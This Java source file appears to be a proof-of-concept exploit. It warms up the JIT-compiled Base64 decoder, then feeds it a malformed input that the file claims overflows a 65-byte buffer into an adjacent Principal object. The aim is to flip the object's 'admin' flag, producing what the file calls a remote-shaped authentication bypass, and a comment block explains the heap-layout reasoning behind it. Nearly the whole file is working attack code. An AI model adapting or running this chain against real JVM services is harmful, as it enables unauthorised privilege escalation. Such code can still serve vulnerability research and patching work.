import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

/**
 * Remote-shaped chain: the spill lands directly on the authority object.
 *
 * Reasoning:
 *   - creds byte[65] occupies 88 bytes, so the next object starts at creds+88
 *   - the spill covers creds+64 .. creds+127
 *   - a Principal allocated right after creds therefore has its header
 *     (mark, klass) and its first fields overwritten
 *   - `admin` is a byte field at object offset 12; the spill puts 0x69 there
 *   - reading a field does NOT dereference klass (only array stores and
 *     virtual calls do), so the corrupted class pointer does not block the read
 *
 * No Unsafe is used to perform the corruption or to read the gate. Unsafe is
 * used only to locate objects for the report, which a remote client would not
 * need.
 */
public final class RemoteChain {
    private static volatile int sink;
    private static sun.misc.Unsafe u;
    static volatile Object LAST;

    static final class Principal {
        volatile boolean admin;
        String user = "anonymous";
    }

    static long addr(Object o) {
        Object[] a = new Object[] { o };
        return u.getLong(a, u.arrayBaseOffset(Object[].class));
    }

    public static void main(String[] a) throws Exception {
        Field uf = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
        uf.setAccessible(true);
        u = (sun.misc.Unsafe) uf.get(null);

        Base64.Decoder d = Base64.getDecoder();
        byte[] valid = "A".repeat(64).getBytes(StandardCharsets.US_ASCII);
        byte[] bad = ("A".repeat(64) + "=").getBytes(StandardCharsets.US_ASCII);
        byte[] warm = new byte[4096];
        for (int i = 0; i < 200_000; i++) sink += d.decode(valid, warm);

        // exactly the allocation order of the endpoint
        byte[] creds = new byte[65];
        Principal principal = new Principal();
        LAST = principal;

        long ca = addr(creds), pa = addr(principal);
        System.out.printf("[layout] creds=0x%x principal=+%d%n", ca, pa - ca);
        System.out.printf("[before] admin=%b user=%s%n", principal.admin, principal.user);

        // WARM then TRIGGER (one trigger per compiled intrinsic)
        for (int i = 0; i < 50_000; i++) sink += d.decode(valid, warm);
        try { d.decode(bad, creds); } catch (IllegalArgumentException e) { }

        boolean adm;
        try {
            adm = principal.admin;
        } catch (Throwable t) {
            System.out.println("[gate] read faulted: " + t);
            System.out.println("RESULT=GATE_FAULT");
            return;
        }
        System.out.println("[after ] admin=" + adm);

        if (!adm) {
            System.out.println("RESULT=GATE_NOT_FLIPPED");
            return;
        }
        System.out.println("[gate] admin authority granted by the overflow");
        System.out.println("RESULT=REMOTE_SHAPED_AUTH_BYPASS");
    }
}
